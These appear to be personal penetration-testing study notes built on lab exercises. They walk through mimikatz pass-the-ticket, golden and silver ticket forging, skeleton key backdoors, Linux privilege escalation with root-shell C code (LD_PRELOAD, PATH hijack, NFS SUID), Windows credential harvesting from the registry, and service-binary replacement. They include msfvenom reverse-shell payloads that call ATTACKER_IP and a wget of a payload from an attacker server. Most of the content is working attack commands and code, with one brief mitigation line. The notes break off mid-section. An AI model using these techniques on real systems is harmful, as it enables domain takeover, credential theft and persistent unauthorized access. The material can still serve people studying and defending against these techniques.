Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

First, we utilize UACME to bypass UAC protection and get “Debug Privileges” and “High Integrity”. We can use “whoami /all” to check current privileges and the integrity level

mimikatz.exe
privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.


Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

    Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
-=-=-=-=-=-=
Golden/Silver Ticket Attacks w/ mimikatz 

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

Dump the krbtgt hash -
  privilege::debug - ensure this outputs [privilege '20' ok]
  lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.


Create a Golden/Silver Ticket - 

Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
  Ex: kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 

Use the Golden/Silver Ticket to access other machines -

misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

 -=-=-=-=-=-=
 Kerberos Backdoors w/ mimikatz 

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

privilege::debug
misc::skeleton 

Accessing the forest - 

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques

Enumeration w/Server Manager


Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.

The only way to access the server manager is to rdp into the server and access the server over an rdp connection

We'll only be going over the basics such as looking at users, groups, and trusts however there are a lot of other mischief that you can get your hands on in terms of enumerating with the server manager

This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.

Intro to shells

One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.

Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener.

Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.



* Another explanation
    + Singles
        > A Single payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. Singles are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process
    + Stagers
        > Stager payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.
        Windows NX vs. NO-NX Stagers
            Reliability issue for NX CPUs and DEP
            NX stagers are bigger (VirtualAlloc memory)
            Default is now NX + Win7 compatible

    + Stages
        > Stages are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:
            A single recv() fails with large payloads
            The Stager receives the middle stager
            The middle Stager then performs a full download
            Also better for RWX

Staged Payloads
    > A staged payload is, simply put, an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.
    > The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (AV) / Intrusion Prevention System (IPS) evasion as much as possible.
    > Stage0 of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine. This is what is known as a reverse connection. As a Metasploit user, we will meet these under the common names reverse_tcp, reverse_https, and bind_tcp. For example, under the show payloads command, you can look for the payloads

#Payload Naming Conventions

  When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
  <OS>/<arch>/<payload>

  For example:
  linux/x86/shell_reverse_tcp
  This would generate a stageless reverse shell for an x86 Linux target.

  The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
  windows/shell_reverse_tcp

  For a 64bit Windows target, the arch would be specified as normal (x64).

  Let's break the payload section down a little further.
  In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). 

  The staged equivalent to this payload would be:
    shell/reverse_tcp
  As staged payloads are denoted with another forward slash (/).

  This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
  windows/x64/meterpreter/reverse_tcp

  A Linux 32bit stageless Meterpreter payload would look like this:

  linux/x86/meterpreter_reverse_tcp

  Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

  msfvenom --list payloads

  This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads.

Once we gain access to a shell

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
 or C:\xampp\FileZilla Server\FileZilla Server.xml
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.


The syntax for this is as follows:

net user <username> <password> /add

net localgroup administrators <username> /add

 ps Command
  The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
  The output of the ps (Process Status) will show the following;
    PID: The process ID (unique to the process)
    TTY: Terminal type used by the user
    Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    CMD: The command or executable running (will NOT display any command line parameter)

  The “ps” command provides a few useful options.

    ps -A: View all running processes
    ps axjf: View process tree (see the tree formation until ps axjf is run below)
    ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

  env

    The env command will show environmental variables.
    The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
    If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH

  sudo -l
    The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

  Id
    The id command will provide a general overview of the user’s privilege level and group memberships.
    It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

  /etc/passwd
    Reading the /etc/passwd file can be an easy way to discover users on the system.

  history
    Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

  ifconfig
    The target system may be a pivoting point to another network. 

  ip route 
    To see wich network routes exist

  netstat
      netstat -a: shows all listening ports and established connections.
      netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
      netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
      netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol. 
      netstat -tp: list connections with the service name and PID information. This can also be used with the -l option to list listening ports
      netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

  The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

      -a: Display all sockets
      -n: Do not resolve names
      -o: Display timers

  find Command

  Find files:

      find . -name flag1.txt: find the file named “flag1.txt” in the current directory
      find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
      find / -type d -name config: find the directory named config under “/”
      find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
      find / -perm a=x: find executable files
      find /home -user frank: find all files for user “frank” under “/home”
      find / -mtime 10: find files that were modified in the last 10 days
      find / -atime 10: find files that were accessed in the last 10 day
      find / -cmin -60: find files changed within the last hour (60 minutes)
      find / -amin -60: find files accesses within the last hour (60 minutes)
      find / -size 50M: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

  It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output 


  Folders and files that can be written to or executed from:

      find / -writable -type d 2>/dev/null : Find world-writeable folders
      find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
      find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

  The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.


      find / -perm -o x -type d 2>/dev/null : Find world-executable folders

  Find development tools and supported languages:

      find / -name perl*
      find / -name python*
      find / -name gcc*

  Find specific file permissions:

  Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

      find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 


  cat /etc/shells #Check available shells

  1 –> Sticky Bit

  2 –> SGID

  4 –> SUID

  7 –> Todos los anteriores

  find / -perm -u=s -type f 2>/dev/null
  find / -perm /4000 -type f 2>/dev/null
  find / -user root -perm -4000 -exec ls -ldb {} \;
  find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.

sudo LD_PRELOAD=/tmp/exploiting.so program-name-here
-=-=-=
Another example with LD_PRELOAD 

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

The function is named _init and that's important, otherwise your exploit code won't work. The reason is that the  _init function runs before any other user-defined code runs, to perform all the necessary initializations. So the name has to be the same, or else it won't work*

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

gcc -fPIC -shared -o shell.so shell.c -nostartfiles


We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

This will result in a shell spawn with root privileges.

Privilege escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled Capabilities. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

getcap -r / 2>/dev/null

PATH  

We could use this script:
#include <unistd.h>
void main()
{
    setuid(0);
    setgid(0);
    system("thm");
}

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit
  gcc path_exp.c -o path -w
  chmod u+s path

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “find / -writable 2>/dev/null” command
find / -writable 2>/dev/null | cut -d"/" -f 2,3 | sort -u

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it.
  export PATH=/tmp:$PATH

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

-=-=-=-=
Network File Sharing

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.
  showmount -e 10.10.45.161

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
#In our machine 
  mkdir /tmp/loquesea 
  mount -o rw 10.10.45.161:/<el share> /tmp/loquesea

#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

9.SSH
SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

    ssh -L 80:intra.example.com:80 gw.example.com 
    ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com

/etc/passwd
    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    Group ID (GID): The primary group ID (stored in /etc/group file)
    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job

Windows privilege escalation
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1.Harvesting passwords from usual spots

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem
	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service
	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
tasklist /svc | findstr /i windowsscheduler
Network Service
	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

#Cleartext passwords 
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 


Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

cmdkey /list

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

runas /savecred /user:admin cmd.exe


IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

#Another way 
Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force


Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.
Command Prompt

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

        

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.87.69 LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt

C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

Abusing Service Misconfigurations
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:

Command Prompt

C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem

        

Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

Service DACL

All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:

Service registry entries

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.


Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:
Command Prompt

C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1

        

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in C:\Progra~2\System~1\WService.exe. We then proceed to check the permissions on the executable:
Command Prompt

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

        

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

        

We can then pull the payload from Powershell with the following command:
Powershell

wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

        

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
Command Prompt

C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.

        

We start a reverse listener on our attacker machine:
Kali Linux

user@attackerpc$ nc -lvp 4445

        

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
Command Prompt

C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler

        

Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445

Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:
Command Prompt

C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

        

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:
Command Prompt

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
